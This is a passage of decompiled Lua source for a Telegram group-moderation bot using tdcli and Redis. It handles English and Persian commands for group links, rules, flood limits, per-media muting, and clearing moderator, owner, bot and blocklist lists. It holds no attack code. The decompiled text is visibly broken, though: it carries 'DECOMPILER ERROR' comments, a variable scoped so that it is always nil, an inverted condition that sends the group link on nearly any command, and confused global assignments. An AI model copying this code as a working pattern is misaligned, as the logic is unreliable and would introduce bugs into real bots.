                                redis:hset("GroupSettings:" .. (msg.to).id, "GroupLink", matches[2])
                                if not lang then
                                  return "`Link Saved!`"
                                else
                                  return "`لینک ذخیره شد!`"
                                end
                              end
                              do
                                if msg.text then
                                  if not (msg.text):match("^([https?://w]*.?telegram.me/joinchat/%S+)$") then
                                    local is_link = (msg.text):match("^([https?://w]*.?t.me/joinchat/%S+)$")
                                  end
                                  if is_link and redis:hget("GroupSettings:" .. (msg.to).id, "GroupLink") == "waiting" and is_owner(msg) then
                                    redis:hset("GroupSettings:" .. (msg.to).id, "GroupLink", msg.text)
                                    if not lang then
                                      return "`Link Saved!`"
                                    else
                                      return "`لینک ذخیره شد!`"
                                    end
                                  end
                                end
                                do
                                  if (matches[1] == "link" or matches[1] == "لینک گروه") and is_mod(msg) and not matches[2] then
                                    local linkgp = redis:hget("GroupSettings:" .. (msg.to).id, "GroupLink")
                                    if not linkgp then
                                      if not lang then
                                        return "Please Set Group Link With `/setlink` or Create New Link With `/newlink`"
                                      else
                                        return "لطفا با دستور `/setlink` لینک گروه را تنظیم کنید یا با دستور `/newlink` لینک جدیدی ایجاد کنید"
                                      end
                                    end
                                    if not lang then
                                      text = "<code>Group Link :</code>\n" .. linkgp
                                    else
                                      text = "<code>لینک گروه :</code>\n" .. linkgp
                                    end
                                    return (tdcli.sendMessage)(chat, msg.id, 1, text, 1, "html")
                                  end
                                  do
                                    if ((matches[1] ~= "link" and matches[1] ~= "لینک گروه") or (matches[2] ~= "pv" and matches[2] ~= "پیوی") or is_mod(msg)) then
                                      local linkgp = redis:hget("GroupSettings:" .. (msg.to).id, "GroupLink")
                                      if not linkgp then
                                        if not lang then
                                          return "Please Set Group Link With `/setlink` or Create New Link With `/newlink`"
                                        else
                                          return "لطفا با دستور `/setlink` لینک گروه را تنظیم کنید یا با دستور `/newlink` لینک جدیدی ایجاد کنید"
                                        end
                                      end
                                      if not lang then
                                        (tdcli.sendMessage)(chat, "", 1, "<b>Link Group has been sended your pv</b>", 1, "html")
                                        ;
                                        (tdcli.sendMessage)(user, "", 1, "<b>Group Link " .. (msg.to).title .. " :</b>\n" .. linkgp, 1, "html")
                                      else
                                        ;
                                        (tdcli.sendMessage)(chat, "", 1, "<b>لینک گروه در پیوی  شما ارسال شد</b>", 1, "html")
                                        ;
                                        (tdcli.sendMessage)(user, "", 1, "<b>لینک گروه " .. (msg.to).title .. " :</b>\n" .. linkgp, 1, "html")
                                      end
                                      if not lang then
                                        return "Link Was Send Your Pv"
                                      else
                                        return "لینک به پیوی شما ارسال شد"
                                      end
                                    end
                                    if (matches[1] == "setrules" or matches[1] == "تنظیم قوانین") and matches[2] and is_mod(msg) then
                                      redis:hset("GroupSettings:" .. (msg.to).id, "rules", matches[2])
                                      if not lang then
                                        return "*Group rules has been set to:*\n" .. matches[2]
                                      else
                                        return "قوانین گروه تنظیم شد به:\n" .. matches[2]
                                      end
                                    end
                                    if matches[1] == "rules" or matches[1] == "قوانین" then
                                      if not redis:hget("GroupSettings:" .. (msg.to).id, "rules") then
                                        if not lang then
                                          _ENV.rules = "Rules:\n*1-*`Do not spam`\n*2-*`Do not use filtered words`\n*3-*`Do not send +18 photos`"
                                        else
                                          if lang then
                                            _ENV.rules = "قوانین:\n*1-*`اسپم نکنید`\n*2-*`از کلمات فیلتر شده استفاده نکنید`\n*3-*`عکس های +18 ارسال نکنید`"
                                          end
                                        end
                                      else
                                        if not lang then
                                          _ENV.rules = "Rules:\n" .. redis:hget("GroupSettings:" .. (msg.to).id, "rules")
                                        else
                                          _ENV.rules = "قوانین:\n" .. redis:hget("GroupSettings:" .. (msg.to).id, "rules")
                                        end
                                      end
                                      return _ENV.rules
                                    end
                                    if (matches[1] == "res" or matches[1] == "اطلاعات") and matches[2] and is_mod(msg) then
                                      tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username, {chat_id = (msg.to).id, username = matches[2], cmd = "res"})
                                    end
                                    if (matches[1] == "setchannel" or matches[1] == "تنظیم کانال") and is_owner(msg) then
                                      if (matches[2]):match("^(@.*)$") then
                                        redis:hset("GroupSettings:" .. (msg.to).id, "group_channel", matches[2])
                                        redis:set("WaitForSetChannel:" .. (msg.to).id .. ":" .. (msg.from).id, true)
                                        if not lang then
                                          return "*Channel Saved!*\nNow Create Bot With @botfather And Send Bot Token:\nIf You Wish, You Can Use The our Helper Bot ( @" .. (_ENV._config).Helper .. " ) By Entering `skip`"
                                        else
                                          return "کانال ذخیره شد!\nهم اکنون با استفاده از @botfather رباتی بسازید و توکن آن را ارسال نمایید:\nدر صورت تمایل می توانید با وارد کردن `skip` از ربات کمکی ما استفاده کنید ( @" .. (_ENV._config).Helper .. " )"
                                        end
                                      else
                                        if (matches[2]):lower() == "off" or matches[2] == "خاموش" then
                                          redis:hdel("GroupSettings:" .. (msg.to).id, "group_channel")
                                          redis:hdel("GroupSettings:" .. (msg.to).id, "group_helper")
                                          if not lang then
                                            return "Forced Join in Channel Has Been Disabled"
                                          else
                                            return "عضویت اجباری در کانال خاموش شد"
                                          end
                                        end
                                      end
                                    end
                                    if (matches[1] == "setflood" or matches[1] == "تنظیم حساسیت پیام رگباری") and is_mod(msg) then
                                      if tonumber(matches[2]) < 1 or 200 < tonumber(matches[2]) then
                                        if not lang then
                                          return "*Please enter a number between* `1` *and* `200`"
                                        else
                                          return "لطفا یک شماره بین `1` تا `200` وارد کنید"
                                        end
                                      end
                                      local flood_max = matches[2]
                                      redis:hset("GroupSettings:" .. (msg.to).id, "num_msg_max", flood_max)
                                      if not lang then
                                        return "*Group flood sensitivity has been set to:* [`" .. matches[2] .. "`]"
                                      else
                                        return "حساسیت پیام رگباری گروه تنظیم شد به: [`" .. matches[2] .. "`]"
                                      end
                                    end
                                    do
                                      if (matches[1] == "setfloodtime" or matches[1] == "تنظیم زمان پیام رگباری") and is_mod(msg) then
                                        if tonumber(matches[2]) < 6 then
                                          if not lang then
                                            return "*Please Enter a number bigger than* `5`"
                                          else
                                            return "لطفا یک شماره بزرگتر از 5 وارد کنید"
                                          end
                                        else
                                          if 6 <= tonumber(matches[2]) then
                                            redis:hset("GroupSettings:" .. (msg.to).id, "FloodTime", tonumber(matches[2]))
                                            if not lang then
                                              return "*Flood Time has been changed to:* `" .. matches[2] .. "`"
                                            else
                                              return "زمان پیام رگباری تغییر کرد به: `" .. matches[2] .. "`"
                                            end
                                          end
                                        end
                                      end
                                      if (matches[1] == "setmaxwords" or matches[1] == "تنظیم حداکثر کلمات") and is_mod(msg) then
                                        if tonumber(matches[2]) < 10 then
                                          if not lang then
                                            return "*Please enter a number bigger than* `10`"
                                          else
                                            return "لطفا یک عدد بزرگتر از `10` وارد کنید"
                                          end
                                        else
                                          if 10 <= tonumber(matches[2]) then
                                            redis:hset("GroupSettings:" .. (msg.to).id, "MaxWords", tonumber(matches[2]))
                                            if not lang then
                                              return "*Group max words has been set to:* [`" .. matches[2] .. "`]"
                                            else
                                              return "حداکثر کلمات در پیام های گروه تنظیم شد به: [`" .. matches[2] .. "`]"
                                            end
                                          end
                                        end
                                      end
                                      if (matches[1] == "setmaxwarn" or matches[1] == "تنظیم حداکثر اخطار") and is_owner(msg) then
                                        if tonumber(matches[2]) < 2 then
                                          if not lang then
                                            return "Please enter a number bigger than `1`"
                                          else
                                            return "لطفا شماره ای بزرگتر از `1` وارد کنید"
                                          end
                                        else
                                          if tonumber(matches[2]) >= 2 then
                                            redis:hset("GroupSettings:" .. (msg.to).id, "MaxWarn", tonumber(matches[2]))
                                            if not lang then
                                              return "Max warn changed to `" .. matches[2] .. "`"
                                            else
                                              return "حداکثر اخطار تغییر کرد به `" .. matches[2] .. "`"
                                            end
                                          end
                                        end
                                      end
                                      if (matches[1] == "invitekicked" or matches[1] == "دعوت اخراج شده ها") and is_owner(msg) and (_ENV.gp_type)((msg.to).id) == "channel" then
                                        (tdcli.getChannelMembers)((msg.to).id, 0, "Kicked", 200, function(i, gp)
    -- function num : 0_56_6 , upvalues : _ENV
    for k,v in pairs(gp.members_) do
      (tdcli.addChatMember)(i.chat_id, v.user_id_, 50, dl_cb, nil)
    end
  end
, {chat_id = (msg.to).id})
                                        if not lang then
                                          return "*Kicked Members has been invited!*"
                                        else
                                          return "اعضا اخراج شده به گروه دعوت شدند!"
                                        end
                                      end
                                      if ((matches[1]):lower() == "clean" or matches[1] == "پاکسازی") and is_owner(msg) then
                                        if matches[2] == "mods" or matches[2] == "مدیران" then
                                          if ((_ENV.next)((data[tostring(chat)]).mods)) == nil then
                                            if not lang then
                                              return "*No moderators in this group*"
                                            else
                                              return "مدیری در گروه نیست"
                                            end
                                          end
                                          for k,v in (_ENV.pairs)((data[tostring(chat)]).mods) do
                                            -- DECOMPILER ERROR at PC4074: Confused about usage of register: R13 in 'UnsetPending'

                                            ((data[tostring(chat)]).mods)[(tostring(k))] = nil
                                            save_data("./data/moderation.json", data)
                                          end
                                          if not lang then
                                            return "*All moderators has been demoted*"
                                          else
                                            return "تمام ادمین های گروه تنزیل مقام شدند"
                                          end
                                        end
                                        if (matches[2] == "deleted" or matches[2] == "دیلیت اکانت ها") and (msg.to).type == "channel" then
                                          _ENV.check_deleted = function(A, B)
    -- function num : 0_56_7 , upvalues : _ENV, msg, lang
    for k,v in pairs(B.members_) do
      clean_cb = function(A, B)
      -- function num : 0_56_7_0 , upvalues : _ENV, msg
      if not B.first_name_ then
        kick_user(B.id_, (msg.to).id)
      end
    end

      ;
      (tdcli.getUser)(v.user_id_, clean_cb, nil)
    end
    if not lang then
      (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*Deleted Accounts has been removed from group*", 1, "md")
    else
      ;
      (tdcli.sendMessage)((msg.to).id, msg.id, 1, "دیلیت اکانت ها از گروه حذف شدند", 1, "md")
    end
  end

                                          tdcli_function({ID = "GetChannelMembers", channel_id_ = (getChatId((msg.to).id)).ID, offset_ = 0, limit_ = 1000}, _ENV.check_deleted, nil)
                                        end
                                        if matches[2] == "allowlist" or matches[2] == "لیست مجاز" then
                                          _ENV.listWord = redis:smembers("AllowFrom~" .. (msg.to).id)
                                          _ENV.listUser = redis:smembers("AllowUserFrom~" .. (msg.to).id)
                                          if #_ENV.listWord == 0 and #_ENV.listUser == 0 then
                                            if not lang then
                                              return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*Groups Allow List is Empty!*", 1, "md")
                                            else
                                              return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "لیست مجاز گروه خالی است!", 1, "md")
                                            end
                                          end
                                          redis:del("AllowFrom~" .. (msg.to).id)
                                          redis:del("AllowUserFrom~" .. (msg.to).id)
                                          if not lang then
                                            return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*Groups Allow list has been cleaned*", 1, "md")
                                          else
                                            return (tdcli.sendMessage)((msg.to).id, msg.id, 1, "لیست مجاز گروه پاکسازی شد", 1, "md")
                                          end
                                        end
                                        if matches[2] == "blacklist" or matches[2] == "blocklist" or matches[2] == "بلاک لیست" or matches[2] == "لیست مسدودی" then
                                          if not is_mod(msg) then
                                            return 
                                          end
                                          local cleanbl = function(ext, res)
    -- function num : 0_56_8 , upvalues : _ENV, lang
    if tonumber(res.total_count_) == 0 then
      if not lang then
        return (tdcli.sendMessage)(ext.chat_id, ext.msg_id, 0, "*Groups Black List is Empty!*", 1, "md")
      else
        return (tdcli.sendMessage)(ext.chat_id, ext.msg_id, 0, "لیست مسدودی گروه خالی می باشد!", 1, "md")
      end
    end
    local x = 0
    for x,y in pairs(res.members_) do
      x = x + 1
      ;
      (tdcli.changeChatMemberStatus)(ext.chat_id, y.user_id_, "Left", dl_cb, nil)
    end
    if not lang then
      return (tdcli.sendMessage)(ext.chat_id, ext.msg_id, 0, "*Groups Black List Has Been Cleaned!*", 1, "md")
    else
      return (tdcli.sendMessage)(ext.chat_id, ext.msg_id, 0, "لیست مسدودی گروه پاکسازی شد!", 1, "md")
    end
  end

                                          return (tdcli.getChannelMembers)((msg.to).id, 0, "Kicked", 200, cleanbl, {chat_id = (msg.to).id, msg_id = msg.id})
                                        end
                                        do
                                          if matches[2] == "bots" or matches[2] == "ربات ها" then
                                            _ENV.clbot = function(arg, data)
    -- function num : 0_56_9 , upvalues : _ENV, msg, lang
    for k,v in pairs(data.members_) do
      if v.user_id_ ~= bot.id then
        kick_user(v.user_id_, (msg.to).id)
      end
    end
    if not lang then
      (tdcli.sendMessage)((msg.to).id, msg.id, 1, "*All Bots in Group Has Been Cleaned!*", 1, "md")
    else
      ;
      (tdcli.sendMessage)((msg.to).id, msg.id, 1, "همه ربات ها در گروه پاکسازی شدند!", 1, "md")
    end
  end

                                            ;
                                            (tdcli.getChannelMembers)((msg.to).id, 0, "Bots", 200, _ENV.clbot, nil)
                                          end
                                          if matches[2] == "filterlist" or matches[2] == "لیست فیلتر" then
                                            _ENV.filterlist = redis:smembers("GroupFilterList:" .. (msg.to).id)
                                            if #_ENV.filterlist == 0 then
                                              if not lang then
                                                return "*Filtered words list* `is empty`"
                                              else
                                                return "لیست کلمات فیلتر شده خالی است"
                                              end
                                            else
                                              redis:del("GroupFilterList:" .. (msg.to).id)
                                              if not lang then
                                                return "*Filtered words list* `has been cleaned`"
                                              else
                                                return "لیست کلمات فیلتر شده پاک شد"
                                              end
                                            end
                                          end
                                          if matches[2] == "rules" or matches[2] == "قوانین" then
                                            if not redis:hget("GroupSettings:" .. (msg.to).id, "rules") then
                                              if not lang then
                                                return "No *rules* available"
                                              else
                                                return "قوانین برای گروه ثبت نشده است"
                                              end
                                            end
                                            redis:hdel("GroupSettings:" .. (msg.to).id, "rules")
                                            if not lang then
                                              return "*Group rules* `has been cleaned`"
                                            else
                                              return "قوانین گروه پاک شد"
                                            end
                                          end
                                          if matches[2] == "welcome" or matches[2] == "خوش آمد گویی" then
                                            if not redis:get("GroupWelcome" .. (msg.to).id) then
                                              if not lang then
                                                return "*Welcome Message not set*"
                                              else
                                                return "پیام خوشآمد گویی ثبت نشده است"
                                              end
                                            end
                                            redis:del("GroupWelcome" .. (msg.to).id)
                                            if not lang then
                                              return "*Welcome message* `has been cleaned`"
                                            else
                                              return "پیام خوشآمد گویی پاک شد"
                                            end
                                          end
                                          if ((matches[1]):lower() == "clean" or matches[1] == "پاکسازی") and is_sudo(msg) and (matches[2] == "owners" or matches[2] == "مالکان" or matches[2] == "مالکین") then
                                            if ((_ENV.next)((data[tostring(chat)]).owners)) == nil then
                                              if not lang then
                                                return "*No* *owners* `in this group`"
                                              else
                                                return "مالکی برای گروه انتخاب نشده است"
                                              end
                                            end
                                            for k,v in (_ENV.pairs)((data[tostring(chat)]).owners) do
                                              -- DECOMPILER ERROR at PC4479: Confused about usage of register: R13 in 'UnsetPending'

                                              ((data[tostring(chat)]).owners)[(tostring(k))] = nil
                                              save_data("./data/moderation.json", data)
                                            end
                                            if not lang then
                                              return "All *owners* `has been demoted`"
                                            else
                                              return "تمامی مالکان گروه تنزیل مقام شدند"
                                            end
                                          end
                                          do
                                            if (matches[1] == "setname" or matches[1] == "تنظیم نام") and matches[2] and is_mod(msg) then
                                              local gp_name = matches[2]
                                              ;
                                              (tdcli.changeChatTitle)(chat, gp_name, _ENV.dl_cb, nil)
                                            end
                                            if (matches[1] == "filterlist" or matches[1] == "لیست فیلتر") and is_mod(msg) then
                                              return (_ENV.filter_list)(msg)
                                            end
                                            if matches[1] == "modlist" or matches[1] == "لیست مدیران" then
                                              return modlist(msg)
                                            end
                                            if (matches[1] == "ownerlist" or matches[1] == "لیست مالکان") and is_owner(msg) then
                                              return ownerlist(msg)
                                            end
                                            if (matches[1] == "config" or matches[1] == "کانفیگ") and is_owner(msg) then
                                              return config(msg, "yes")
                                            end
                                            if (matches[1] == "settings" or matches[1] == "تنظیمات") and is_mod(msg) then
                                              return (_ENV.group_settings)(msg, _ENV.target)
                                            end
                                            if (matches[1] == "mute" or matches[1] == "میوت") and is_mod(msg) then
                                              if redis:get("mute_time:" .. (msg.to).id) then
                                                _ENV.expire = tonumber(redis:get("mute_time:" .. (msg.to).id)) * 60
                                              else
                                                _ENV.expire = 86400
                                              end
                                              _ENV.SendMuteUser = function(ID, item, nameEN, nameFA)
    -- function num : 0_56_10 , upvalues : _ENV, msg
    end_time = (math.ceil)(redis:ttl("mute" .. ID .. "from" .. (msg.to).id .. item) / 60)
    if redis:get("mute" .. ID .. "from" .. (msg.to).id .. item) then
      return SendStatus((msg.to).id, ID, "Already Muted\nMsg: " .. nameEN .. "\nEnd Time: " .. end_time .. " Minutes", "از قبل میوت بود\nنوع پیام: " .. nameFA .. "\nپایان: " .. end_time .. " دقیقه")
    else
      redis:setex("mute" .. ID .. "from" .. (msg.to).id .. item, expire, true)
      Time = expire / 60
      return SendStatus((msg.to).id, ID, "Muted\nMsg: " .. nameEN .. "\nEnd Time: " .. Time .. " Minutes", "میوت شد\nنوع پیام: " .. nameFA .. "\nپایان: " .. Time .. " دقیقه")
    end
  end

                                              if matches[2] and matches[3] and not msg.reply_id then
                                                if matches[2] == "time" then
                                                  _ENV.number = tonumber(matches[3])
                                                  if _ENV.number < 1 then
                                                    if not lang then
                                                      return "*Please use a number bigger than* `1`"
                                                    else
                                                      return "لطفا عددی بزرگ تر از `1` استفاده کنید"
                                                    end
                                                  end
                                                  redis:set("mute_time:" .. (msg.to).id, matches[3])
                                                  if not lang then
                                                    return "*Mute time has been changed to:* " .. matches[3] .. " Minutes"
                                                  else
                                                    return "زمان میوت با موفقیت تغییر کرد به: " .. matches[3] .. " دقیقه"
                                                  end
                                                end
                                                if (_ENV.isModerator)((msg.to).id, matches[3]) then
                                                  return (_ENV.NoAccess)((msg.to).id)
                                                end
                                                if matches[2] == "sticker" or matches[2] == "استیکر" then
                                                  (_ENV.SendMuteUser)(matches[3], "sticker", "Sticker", "استیکر")
                                                end
                                                if matches[2] == "photo" or matches[2] == "عکس" then
                                                  (_ENV.SendMuteUser)(matches[3], "photo", "Photo", "عکس")
                                                end
                                                if matches[2] == "video" or matches[2] == "فیلم" then
                                                  (_ENV.SendMuteUser)(matches[3], "video", "Video", "فیلم")
                                                end
                                                if matches[2] == "voice" or matches[2] == "صدا" then
                                                  (_ENV.SendMuteUser)(matches[3], "voice", "Voice", "صدا")
                                                end
                                                if matches[2] == "audio" or matches[2] == "آهنگ" then
                                                  (_ENV.SendMuteUser)(matches[3], "audio", "Audio", "آهنگ")
                                                end
                                                if matches[2] == "gif" or matches[2] == "گیف" then
                                                  (_ENV.SendMuteUser)(matches[3], "gif", "Gif", "گیف")
                                                end
                                                if matches[2] == "cmds" or matches[2] == "دستورات" then
                                                  (_ENV.SendMuteUser)(matches[3], "cmds", "Cmds", "دستورات")
                                                end
                                              else
                                                if matches[2] and not matches[3] and msg.reply_id then
                                                  _ENV.MutesCb = function(extra, result, success)
    -- function num : 0_56_11 , upvalues : user, _ENV, msg, matches
    user = result.sender_user_id_
    if isModerator((msg.to).id, user) then
      return NoAccess((msg.to).id)
    end
    if matches[2] == "sticker" or matches[2] == "استیکر" then
      SendMuteUser(user, "sticker", "Sticker", "استیکر")
    end
    if matches[2] == "photo" or matches[2] == "عکس" then
      SendMuteUser(user, "photo", "Photo", "عکس")
    end
    if matches[2] == "video" or matches[2] == "فیلم" then
      SendMuteUser(user, "video", "Video", "فیلم")
    end
    if matches[2] == "voice" or matches[2] == "صدا" then
      SendMuteUser(user, "voice", "Voice", "صدا")
    end
    if matches[2] == "audio" or matches[2] == "آهنگ" then
      SendMuteUser(user, "audio", "Audio", "آهنگ")
    end
    if matches[2] == "gif" or matches[2] == "گیف" then
      SendMuteUser(user, "gif", "Gif", "گیف")
    end
    if matches[2] == "cmds" or matches[2] == "دستورات" then
      SendMuteUser(user, "cmds", "Cmds", "دستورات")
    end
  end

                                                  tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.MutesCb, nil)
                                                end
                                              end
                                            end
                                            if (matches[1] == "unmute" or matches[1] == "برداشتن میوت") and is_mod(msg) then
                                              _ENV.SendMuteUser = function(ID, item, nameEN, nameFA)
    -- function num : 0_56_12 , upvalues : _ENV, msg
    if not redis:get("mute" .. ID .. "from" .. (msg.to).id .. item) then
      return SendStatus((msg.to).id, ID, "is Not Muted\nMsg: " .. nameEN, "میوت نبود\nنوع پیام: " .. nameFA)
    else
      redis:del("mute" .. ID .. "from" .. (msg.to).id .. item)
      return SendStatus((msg.to).id, ID, "Unmuted\nMsg: " .. nameEN, "دیگه میوت نیست!\nنوع پیام: " .. nameFA)
    end
  end

                                              if matches[2] and matches[3] and not msg.reply_id then
                                                if (_ENV.isModerator)((msg.to).id, matches[3]) then
                                                  return (_ENV.NoAccess)((msg.to).id)
                                                end
                                                if matches[2] == "sticker" or matches[2] == "استیکر" then
                                                  (_ENV.SendMuteUser)(matches[3], "sticker", "Sticker", "استیکر")
                                                end
                                                if matches[2] == "photo" or matches[2] == "عکس" then
                                                  (_ENV.SendMuteUser)(matches[3], "photo", "Photo", "عکس")
                                                end
                                                if matches[2] == "video" or matches[2] == "فیلم" then
                                                  (_ENV.SendMuteUser)(matches[3], "video", "Video", "فیلم")
                                                end
                                                if matches[2] == "voice" or matches[2] == "صدا" then
                                                  (_ENV.SendMuteUser)(matches[3], "voice", "Voice", "صدا")
                                                end
                                                if matches[2] == "audio" or matches[2] == "آهنگ" then
                                                  (_ENV.SendMuteUser)(matches[3], "audio", "Audio", "آهنگ")
                                                end
                                                if matches[2] == "gif" or matches[2] == "گیف" then
                                                  (_ENV.SendMuteUser)(matches[3], "gif", "Gif", "گیف")
                                                end
                                                if matches[2] == "cmds" or matches[2] == "دستورات" then
                                                  (_ENV.SendMuteUser)(matches[3], "cmds", "Cmds", "دستورات")
                                                end
                                              else
                                                if matches[2] and not matches[3] and msg.reply_id then
                                                  _ENV.MutesCb = function(extra, result, success)
    -- function num : 0_56_13 , upvalues : user, _ENV, msg, matches
    user = result.sender_user_id_
    if isModerator((msg.to).id, user) then
      return NoAccess((msg.to).id)
    end
    if matches[2] == "sticker" or matches[2] == "استیکر" then
      SendMuteUser(user, "sticker", "Sticker", "استیکر")
    end
    if matches[2] == "photo" or matches[2] == "عکس" then
      SendMuteUser(user, "photo", "Photo", "عکس")
    end
    if matches[2] == "video" or matches[2] == "فیلم" then
      SendMuteUser(user, "video", "Video", "فیلم")
    end
    if matches[2] == "voice" or matches[2] == "صدا" then
      SendMuteUser(user, "voice", "Voice", "صدا")
    end
    if matches[2] == "audio" or matches[2] == "آهنگ" then
      SendMuteUser(user, "audio", "Audio", "آهنگ")
    end
    if matches[2] == "gif" or matches[2] == "گیف" then
      SendMuteUser(user, "gif", "Gif", "گیف")
    end
    if matches[2] == "cmds" or matches[2] == "دستورات" then
      SendMuteUser(user, "cmds", "Cmds", "دستورات")
    end
  end

                                                  tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.MutesCb, nil)
                                                end
                                              end
                                            end
                                            if matches[1] == "mymute" or matches[1] == "mm" or matches[1] == "میوت من" then
                                              user = (msg.from).id
                                              chat = (msg.to).id
                                              sticker = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "sticker") / 60)
                                              photo = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "photo") / 60)
                                              video = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "video") / 60)
                                              voice = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "voice") / 60)
                                              audio = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "audio") / 60)
                                              gif = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "gif") / 60)
                                              cmds = ((_ENV.math).ceil)(redis:ttl("mute" .. user .. "from" .. chat .. "cmds") / 60)
                                              if sticker > 0 then
                                                if not lang then
                                                  _ENV.text1 = "*Mute Sticker:* `" .. sticker .. " Minutes`"
                                                else
                                                  _ENV.text1 = "*میوت استیکر:* `" .. sticker .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text1 = "*Mute Sticker:* `Not Found!`"
                                                else
                                                  _ENV.text1 = "*میوت استیکر:* `پیدا نشد!`"
                                                end
                                              end
                                              if photo > 0 then
                                                if not lang then
                                                  _ENV.text2 = "*Mute Photo:* `" .. photo .. " Minutes`"
                                                else
                                                  _ENV.text2 = "*میوت عکس:* `" .. photo .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text2 = "*Mute Photo:* `Not Found!`"
                                                else
                                                  _ENV.text2 = "*میوت عکس:* `پیدا نشد!`"
                                                end
                                              end
                                              if video > 0 then
                                                if not lang then
                                                  _ENV.text3 = "*Mute Video:* `" .. video .. " Minutes`"
                                                else
                                                  _ENV.text3 = "*میوت فیلم:* `" .. video .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text3 = "*Mute Video:* `Not Found!`"
                                                else
                                                  _ENV.text3 = "*میوت فیلم:* `پیدا نشد!`"
                                                end
                                              end
                                              if voice > 0 then
                                                if not lang then
                                                  _ENV.text4 = "*Mute Voice:* `" .. voice .. " Minutes`"
                                                else
                                                  _ENV.text4 = "*میوت صدا:* `" .. voice .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text4 = "*Mute Voice:* `Not Found!`"
                                                else
                                                  _ENV.text4 = "*میوت صدا:* `پیدا نشد!`"
                                                end
                                              end
                                              if audio > 0 then
                                                if not lang then
                                                  _ENV.text5 = "*Mute Audio:* `" .. audio .. " Minutes`"
                                                else
                                                  _ENV.text5 = "*میوت آهنگ:* `" .. audio .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text5 = "*Mute Audio:* `Not Found!`"
                                                else
                                                  _ENV.text5 = "*میوت آهنگ:* `پیدا نشد!`"
                                                end
                                              end
                                              if gif > 0 then
                                                if not lang then
                                                  _ENV.text6 = "*Mute Gif:* `" .. gif .. " Minutes`"
                                                else
                                                  _ENV.text6 = "*میوت گیف:* `" .. gif .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text6 = "*Mute Gif:* `Not Found!`"
                                                else
                                                  _ENV.text6 = "*میوت گیف:* `پیدا نشد!`"
                                                end
                                              end
                                              if cmds > 0 then
                                                if not lang then
                                                  _ENV.text7 = "*Mute Cmds:* `" .. cmds .. " Minutes`"
                                                else
                                                  _ENV.text7 = "*میوت دستورات:* `" .. cmds .. " دقیقه`"
                                                end
                                              else
                                                if not lang then
                                                  _ENV.text7 = "*Mute Cmds:* `Not Found!`"
                                                else
                                                  _ENV.text7 = "میوت دستورات: `پیدا نشد!`"
                                                end
                                              end
                                              return _ENV.text1 .. "\n" .. _ENV.text2 .. "\n" .. _ENV.text3 .. "\n" .. _ENV.text4 .. "\n" .. _ENV.text5 .. "\n" .. _ENV.text6 .. "\n" .. _ENV.text7
                                            end
                                            if (matches[1] == "setforcedinvite" or matches[1] == "تنظیم دعوت اجباری") and is_owner(msg) then
                                              if tonumber(matches[2]) < 1 then
                                                if not lang then
                                                  return "*Please Enter A Number Bigger Than* `0`"
                                                else
                                                  return "لطفا یک عدد بزرگتر از `0` وارد کنید"
                                                end
                                              else
                                                redis:hset("GroupSettings:" .. (msg.to).id, "ForcedInvite", tonumber(matches[2]))
                                                if not lang then
                                                  return "*Number of Member For Forced Invite Has Been Changed To:* [`" .. matches[2] .. "`]"
                                                else
                                                  return "تعداد عضو برای دعوت اجباری تغییر کرد به [`" .. matches[2] .. "`]"
                                                end
                                              end
                                            end
                                            if (matches[1] == "addreply" or matches[1] == "اضافه کردن پاسخ") and is_sudo(msg) then
                                              if not redis:sismember("SudoAccess" .. (msg.from).id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
                                                if not lang then
                                                  return ErrorAccessSudo(msg)
                                                else
                                                  return ErrorAccessSudo(msg)
                                                end
                                              else
                                                if redis:sismember("BotReply:" .. matches[2], matches[3]) then
                                                  if not lang then
                                                    return "*This reply is already added!*"
                                                  else
                                                    return " این پاسخ قبلا اضافه شده است!"
                                                  end
                                                else
                                                  if matches[3] == "ALL" or matches[3] == "همه" then
                                                    if not lang then
                                                      return "*This reply can not be added!*"
                                                    else
                                                      return "این پاسخ نمیتواند اضافه شود!"
                                                    end
                                                  else
                                                    redis:sadd("BotReply:" .. matches[2], matches[3])
                                                    if not lang then
                                                      return "*Reply has been added*"
                                                    else
                                                      return "پاسخ با موفقیت اضافه شد"
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                            if (matches[1] == "delreply" or matches[1] == "حذف پاسخ") and is_sudo(msg) then
                                              if not redis:sismember("SudoAccess" .. (msg.from).id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
                                                if not lang then
                                                  return ErrorAccessSudo(msg)
                                                else
                                                  return ErrorAccessSudo(msg)
                                                end
                                              else
                                                if redis:sismember("BotReply:" .. matches[2], matches[3]) then
                                                  redis:srem("BotReply:" .. matches[2], matches[3])
                                                  if not lang then
                                                    return "*Reply has been deleted*"
                                                  else
                                                    return "پاسخ با موفقیت حذف شد"
                                                  end
                                                else
                                                  if matches[3] == "ALL" or matches[3] == "همه" then
                                                    redis:del("BotReply:" .. matches[2])
                                                    if not lang then
                                                      return "*All replies of* {`" .. matches[2] .. "`} *has been deleted*"
                                                    else
                                                      return "همه پاسخ های {`" .. matches[2] .. "`} با موفقیت حذف شدند"
                                                    end
                                                  else
                                                    if not lang then
                                                      return "*This reply is not added!*"
                                                    else
                                                      return "این پاسخ اضافه نشده است!"
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                            if (matches[1] == "allreply" or matches[1] == "همه پاسخ های") and is_sudo(msg) then
